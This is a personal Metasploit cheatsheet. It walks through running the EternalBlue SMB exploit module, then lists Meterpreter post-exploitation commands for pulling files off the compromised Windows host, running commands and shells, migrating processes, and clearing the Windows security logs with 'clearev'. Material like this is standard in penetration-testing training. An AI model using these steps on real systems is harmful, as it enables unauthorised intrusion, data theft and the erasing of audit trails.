# Metasploit
*Personal cheatsheet*<br/> <br/>
## Basic commands
```help```<br/>
```search```&emsp;Search modules<br/>
```use```&emsp;Select a module<br/>
```info```&emsp;Display info about a specific module<br/>
```options```&emsp;List options you can set<br/>
```advanced```&emsp;Display advanced options for a specific module<br/>
```show```&emsp;Show options in a specific category<br/>
## First steps w/ Metasploit
### ```Eternalblue```
```search eternalblue```<br/>
```use exploit/windows/smb/ms17_010_eternalblue``` to select the module<br/>
```show options```<br/>
```set``` to set a value to a module options<br/>
&nbsp;&nbsp;&nbsp;&nbsp;*ex:* ```set SMBPass username```<br/>
```show payloads``` to list compatible payloads<br/>
```set PAYLOAD <index>``` to select the desired payload, ```index``` *being the id of the playload from* ```show payloads```<br/>
```exploit``` to run the exploit once you've configured all the desired options<br/>
```sessions``` to list all active sessions<br/>
```session -i <index>``` to go into interactive mode with a session, ```index``` *being the id of the session from* ```sessions```<br/>
### ```Meterpreter```
Once you've run an exploit, ideally it'll give you either a regular command shell or a meterpreter shell.<br/>
```meterpreter``` allows you to do various things to **interact w/ the machine**, cf. [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) for the complete list of cmds.<br/>
```download <filepath>``` to dl a file from the remote machine. *NB: you'll need to use **double slashes** for Windows environment*<br/>
```upload <local_file_location> <remote_file_location>``` to upload a file to the machine. *Just like download, you'll need to use **double slashes***<br/>
```ps``` to list **running process**.<br/>
```migrate [<new_pid>]``` is used to **"migrate" from the current process to another** process, *it's possible to specify the PID you'll like to migrate to by specifying it ```<new_pid```*<br/>
```ls``` list files in the current directory.<br/>
```execute``` to execute a command on the remote host.<br/>
```shell``` will start an interactive shell on the remote host.<br/>
```search``` to find files on the remote host.<br/>
```cat``` to display the content of a file.<br/>
```background``` will put your meterpreter shell in background, *to return to the meterpreter shell* ```session -i <session_id>```<br/>
```clearev``` will clear the **Application, System, and Security logs** on a **Windows system**.
